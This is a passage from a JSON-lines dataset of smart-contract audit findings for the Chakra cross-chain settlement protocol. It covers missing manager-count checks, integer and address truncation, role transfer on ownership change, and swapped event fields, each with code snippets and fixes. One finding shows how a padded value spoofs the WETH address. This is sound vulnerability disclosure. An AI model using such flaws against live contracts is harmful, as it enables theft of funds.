code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\n\n# Vulnerability details\n\n## Impact\n\nThe remove_manager() method does not have a minimum number of managers, which may cause all managers to be deleted.\n\nThe current implementation of the remove_manager function does not check whether all managers are removed, which poses a significant risk. If all managers are removed from the system, it will lose its administrative functionality. Without any managers, no one can execute critical administrative tasks, such as adding new managers, validators, or upgrading the contract. This may result in the system being unable to respond to necessary changes, effectively locking the contract in its current state.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\nIn the current implementation, the remove_manager function simply removes a manager by setting their status to 0 in the chakra_managers storage, without ensuring that at least one manager remains. This creates a situation where all managers could potentially be removed.\n\nHeres a simplified view of the relevant part:\n\n```\nfn remove_manager(ref self: ContractState, old_manager: ContractAddress) -> bool {\n    let caller = get_caller_address();\n    assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n    self.chakra_managers.write(old_manager, 0);\n    self\n        .emit(\n            ManagerRemoved {\n                operator: caller,\n                old_manager: old_manager,\n                removed_at: get_block_timestamp()\n            }\n        );\n    return self.chakra_managers.read(old_manager) == 0;\n}\n```\n\nIn this example, after calling remove_manager, there is no check to ensure that at least one manager remains in the chakra_managers map. If the last remaining manager is removed, the system will be left without any entity that can perform administrative actions.\n\n## Tools Used\n\nVSCode\n\n## Recommended Mitigation Steps\n\n**Ensure at Least One Manager Remains**: Before allowing a manager to be removed, add a check to ensure that there is at least one other manager left in the system. This can be done by counting the number of managers in the `chakra_managers` storage and asserting that it is greater than one before executing the removal.\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-234", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 234, "page_start": null, "title": "Loss of data due to incorrect parse of id", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-#L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-#L58\n\n\n# Vulnerability details\n\n## Impact\nThe id function slices the _msg array from ID_OFFSET = 1 to PAYLOAD_TYPE_OFFSET = 33. As a result, this slice contains 32 bytes (from position 1 to 32, inclusive). When we cast these 32 bytes (bytes32) to bytes8, only the first 8 bytes are retained, which leads to potential data loss. This data loss can disrupt the entire protocol's functionality.\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\n```diff\n-function id(bytes calldata _msg) internal pure returns (uint64) {\n+function id(bytes calldata _msg) internal pure returns (uint256) {\n-   return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+   return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n}\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe id function slices the _msg array from ID_OFFSET = 1 to PAYLOAD_TYPE_OFFSET = 33. As a result, this slice contains 32 bytes (from position 1 to 32, inclusive). When we cast these 32 bytes (bytes32) to bytes8, only the first 8 bytes are retained, which leads to potential data loss. This data loss can disrupt the entire protocol's functionality.\n", "recommendation_md": "## Recommended Mitigation Steps\n```diff\n-function id(bytes calldata _msg) internal pure returns (uint64) {\n+function id(bytes calldata _msg) internal pure returns (uint256) {\n-   return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+   return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n}\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-#L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-#L58\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-#L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-#L58\n\n\n# Vulnerability details\n\n## Impact\nThe id function slices the _msg array from ID_OFFSET = 1 to PAYLOAD_TYPE_OFFSET = 33. As a result, this slice contains 32 bytes (from position 1 to 32, inclusive). When we cast these 32 bytes (bytes32) to bytes8, only the first 8 bytes are retained, which leads to potential data loss. This data loss can disrupt the entire protocol's functionality.\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\n```diff\n-function id(bytes calldata _msg) internal pure returns (uint64) {\n+function id(bytes calldata _msg) internal pure returns (uint256) {\n-   return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+   return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n}\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-#L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-#L58\n\n\n# Vulnerability details\n\n## Impact\nThe id function slices the _msg array from ID_OFFSET = 1 to PAYLOAD_TYPE_OFFSET = 33. As a result, this slice contains 32 bytes (from position 1 to 32, inclusive). When we cast these 32 bytes (bytes32) to bytes8, only the first 8 bytes are retained, which leads to potential data loss. This data loss can disrupt the entire protocol's functionality. \n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\n```diff\n-function id(bytes calldata _msg) internal pure returns (uint64) {\n+function id(bytes calldata _msg) internal pure returns (uint256) {\n-   return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+   return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n}\n```\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-236", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 236, "page_start": null, "title": "toAddress() truncation casting", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\n\n# Vulnerability details\n\n## Impact\nIn the AddressCast contract the toAddress() will change the type of an input from bytes32 and uint256 to an address:\nuint256 -> address\nbytes32 -> address\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\nand this function is being used by the contract to properly handle the payload message.\n\nand when the off-chain actors forward the message, and let the target on-chain contract to validate the message, this can bring up a risk of address truncating, because the toAddress() function that being used will truncate the uint256 and bytes32 address to the correct address format.\n\nfor example other chain initiate a message that will interacting this address.\n\n0x000000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\nafter toAddress() this WETH address will become\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\n\nHowever, this address\n0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (malicious WETH)\nthrough toAddress() will also resolve to valid WETH address\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\nsolidity example to test this\n```\nuint256 public wethAddress = uint256(uint160(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));\n\nuint256 public maliciousWETH = 0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\nfunction to_address( uint256 _address) external view returns (address result) {\n\tresult = address(uint160(_address));\n}\n```\n\n## Tools Used\nremix, manual\n\n## Recommended Mitigation Steps\nAdd additional check on the toAddress(), and check whether or not the address is lower than 1461501637330902918203684832716283019655932542975 or 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nIn the AddressCast contract the toAddress() will change the type of an input from bytes32 and uint256 to an address:\nuint256 -> address\nbytes32 -> address\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\nand this function is being used by the contract to properly handle the payload message.\n\nand when the off-chain actors forward the message, and let the target on-chain contract to validate the message, this can bring up a risk of address truncating, because the toAddress() function that being used will truncate the uint256 and bytes32 address to the correct address format.\n\nfor example other chain initiate a message that will interacting this address.\n\n0x000000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\nafter toAddress() this WETH address will become\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\n\nHowever, this address\n0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (malicious WETH)\nthrough toAddress() will also resolve to valid WETH address\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\nsolidity example to test this\n```\nuint256 public wethAddress = uint256(uint160(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));\n\nuint256 public maliciousWETH = 0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\nfunction to_address( uint256 _address) external view returns (address result) {\n\tresult = address(uint160(_address));\n}\n```\n", "recommendation_md": "## Recommended Mitigation Steps\nAdd additional check on the toAddress(), and check whether or not the address is lower than 1461501637330902918203684832716283019655932542975 or 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nremix, manual\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\n\n# Vulnerability details\n\n## Impact\nIn the AddressCast contract the toAddress() will change the type of an input from bytes32 and uint256 to an address:\nuint256 -> address\nbytes32 -> address\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\nand this function is being used by the contract to properly handle the payload message.\n\nand when the off-chain actors forward the message, and let the target on-chain contract to validate the message, this can bring up a risk of address truncating, because the toAddress() function that being used will truncate the uint256 and bytes32 address to the correct address format.\n\nfor example other chain initiate a message that will interacting this address.\n\n0x000000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\nafter toAddress() this WETH address will become\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\n\nHowever, this address\n0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (malicious WETH)\nthrough toAddress() will also resolve to valid WETH address\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\nsolidity example to test this\n```\nuint256 public wethAddress = uint256(uint160(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));\n\nuint256 public maliciousWETH = 0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\nfunction to_address( uint256 _address) external view returns (address result) {\n\tresult = address(uint160(_address));\n}\n```\n\n## Tools Used\nremix, manual\n\n## Recommended Mitigation Steps\nAdd additional check on the toAddress(), and check whether or not the address is lower than 1461501637330902918203684832716283019655932542975 or 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\n\n# Vulnerability details\n\n## Impact\nIn the AddressCast contract the toAddress() will change the type of an input from bytes32 and uint256 to an address:\nuint256 -> address\nbytes32 -> address\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L24\n\nand this function is being used by the contract to properly handle the payload message.\n\nand when the off-chain actors forward the message, and let the target on-chain contract to validate the message, this can bring up a risk of address truncating, because the toAddress() function that being used will truncate the uint256 and bytes32 address to the correct address format.\n\nfor example other chain initiate a message that will interacting this address.\n\n0x000000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\nafter toAddress() this WETH address will become \n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\n\nHowever, this address \n0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (malicious WETH)\nthrough toAddress() will also resolve to valid WETH address\n0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)\n\nsolidity example to test this \n```\nuint256 public wethAddress = uint256(uint160(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));\n\nuint256 public maliciousWETH = 0xAA0000000000000000C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\nfunction to_address( uint256 _address) external view returns (address result) {\n\tresult = address(uint160(_address));\n}\n```\n\n## Tools Used\nremix, manual\n\n## Recommended Mitigation Steps\nAdd additional check on the toAddress(), and check whether or not the address is lower than 1461501637330902918203684832716283019655932542975 or 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-257", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 257, "page_start": null, "title": "Role Is Not Being Transferred Along With Ownership Transfer", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53-L54\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L63-L64\n\n\n# Vulnerability details\n\n## Impact\nThe `grantRole` and `revokeRole` operations in the `add_manager` and `remove_manager` functions are restricted to the `onlyOwner`. This means the owner implicitly needs to have the `DEFAULT_ADMIN_ROLE`. However, during ownership transfer, the `DEFAULT_ADMIN_ROLE` is not automatically assigned to the new owner. As a result, the new owner might not be able to grant or revoke roles, causing a potential temporary denial of service (DoS) scenario where the new owner cannot manage roles effectively.\n\n\n## Proof of Concept\nIn the contract, `grantRole` and `revokeRole` are called by functions restricted to `onlyOwner`:\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\nWhen ownership is transferred using `transferOwnership`, the `DEFAULT_ADMIN_ROLE` is not transferred to the new owner. As a result, the new owner may not be able to add or remove managers for a short period of time, leading to potential role management issues.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nOverride the transferOwnership function to automatically grant the `DEFAULT_ADMIN_ROLE` to the newOwner and revoke it from the previous owner. This will ensure the new owner has full role management capabilities, avoiding any temporary denial of service (DoS) issues.\n\n\n## Assessed type\n\nAccess Control\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe `grantRole` and `revokeRole` operations in the `add_manager` and `remove_manager` functions are restricted to the `onlyOwner`. This means the owner implicitly needs to have the `DEFAULT_ADMIN_ROLE`. However, during ownership transfer, the `DEFAULT_ADMIN_ROLE` is not automatically assigned to the new owner. As a result, the new owner might not be able to grant or revoke roles, causing a potential temporary denial of service (DoS) scenario where the new owner cannot manage roles effectively.\n", "recommendation_md": "## Recommended Mitigation Steps\nOverride the transferOwnership function to automatically grant the `DEFAULT_ADMIN_ROLE` to the newOwner and revoke it from the previous owner. This will ensure the new owner has full role management capabilities, avoiding any temporary denial of service (DoS) issues.\n\n\n## Assessed type\n\nAccess Control\n", "poc_md": "## Proof of Concept\nIn the contract, `grantRole` and `revokeRole` are called by functions restricted to `onlyOwner`:\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\nWhen ownership is transferred using `transferOwnership`, the `DEFAULT_ADMIN_ROLE` is not transferred to the new owner. As a result, the new owner may not be able to add or remove managers for a short period of time, leading to potential role management issues.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53-L54\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L63-L64\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53-L54\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L63-L64\n\n\n# Vulnerability details\n\n## Impact\nThe `grantRole` and `revokeRole` operations in the `add_manager` and `remove_manager` functions are restricted to the `onlyOwner`. This means the owner implicitly needs to have the `DEFAULT_ADMIN_ROLE`. However, during ownership transfer, the `DEFAULT_ADMIN_ROLE` is not automatically assigned to the new owner. As a result, the new owner might not be able to grant or revoke roles, causing a potential temporary denial of service (DoS) scenario where the new owner cannot manage roles effectively.\n\n\n## Proof of Concept\nIn the contract, `grantRole` and `revokeRole` are called by functions restricted to `onlyOwner`:\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\nWhen ownership is transferred using `transferOwnership`, the `DEFAULT_ADMIN_ROLE` is not transferred to the new owner. As a result, the new owner may not be able to add or remove managers for a short period of time, leading to potential role management issues.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nOverride the transferOwnership function to automatically grant the `DEFAULT_ADMIN_ROLE` to the newOwner and revoke it from the previous owner. This will ensure the new owner has full role management capabilities, avoiding any temporary denial of service (DoS) issues.\n\n\n## Assessed type\n\nAccess Control\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53-L54\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L63-L64\n\n\n# Vulnerability details\n\n## Impact\nThe `grantRole` and `revokeRole` operations in the `add_manager` and `remove_manager` functions are restricted to the `onlyOwner`. This means the owner implicitly needs to have the `DEFAULT_ADMIN_ROLE`. However, during ownership transfer, the `DEFAULT_ADMIN_ROLE` is not automatically assigned to the new owner. As a result, the new owner might not be able to grant or revoke roles, causing a potential temporary denial of service (DoS) scenario where the new owner cannot manage roles effectively.\n\n\n## Proof of Concept\nIn the contract, `grantRole` and `revokeRole` are called by functions restricted to `onlyOwner`:\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\nWhen ownership is transferred using `transferOwnership`, the `DEFAULT_ADMIN_ROLE` is not transferred to the new owner. As a result, the new owner may not be able to add or remove managers for a short period of time, leading to potential role management issues.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nOverride the transferOwnership function to automatically grant the `DEFAULT_ADMIN_ROLE` to the newOwner and revoke it from the previous owner. This will ensure the new owner has full role management capabilities, avoiding any temporary denial of service (DoS) issues.\n\n\n## Assessed type\n\nAccess Control"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-271", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 271, "page_start": null, "title": "The user's message might be finalized by validators on the wrong chain due to incorrect event emission.", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\nIn the `receive_cross_chain_msg` function, the `CrossChainHandleResult` event emits `from_chain(source chain) `as `contract_chain_name` and `to_chain(destination chain)` as `from_chain`. However, the `contract_chain_name` should represent the destination chain, while the rest should represent the source chain. This will allow validators to correctly callback via the `receive_cross_chain_callback` function and finalize the user's message.\n\n```solidity\n event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n```\n\n```solidity\nemit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n## Impact\nValidators might burn tokens on the wrong chain when the mode is `MintBurn`.\n```solidity\nif (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n```\n\nValidators maybe not be able to verify and finalize transactions.\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235C1-L244C6\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nConsider replacing `contract_chain_name` with `from_chain`.\n\n```diff\nemit CrossChainHandleResult(\n            txid,\n            status,\n+           from_chain, // Source chain\n+           contract_chain_name, // Destination chain\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nValidators might burn tokens on the wrong chain when the mode is `MintBurn`.\n```solidity\nif (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n```\n\nValidators maybe not be able to verify and finalize transactions.\n", "recommendation_md": "## Recommended Mitigation Steps\nConsider replacing `contract_chain_name` with `from_chain`.\n\n```diff\nemit CrossChainHandleResult(\n            txid,\n            status,\n+           from_chain, // Source chain\n+           contract_chain_name, // Destination chain\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235C1-L244C6\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n**container:**\n# Vulnerability details\n\nIn the `receive_cross_chain_msg` function, the `CrossChainHandleResult` event emits `from_chain(source chain) `as `contract_chain_name` and `to_chain(destination chain)` as `from_chain`. However, the `contract_chain_name` should represent the destination chain, while the rest should represent the source chain. This will allow validators to correctly callback via the `receive_cross_chain_callback` function and finalize the user's message.\n\n```solidity\n event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n```\n\n```solidity\nemit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n**tools_used:**\n## Tools Used\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\nIn the `receive_cross_chain_msg` function, the `CrossChainHandleResult` event emits `from_chain(source chain) `as `contract_chain_name` and `to_chain(destination chain)` as `from_chain`. However, the `contract_chain_name` should represent the destination chain, while the rest should represent the source chain. This will allow validators to correctly callback via the `receive_cross_chain_callback` function and finalize the user's message.\n\n```solidity\n event CrossChainHandleResult(\n        uint256 indexed 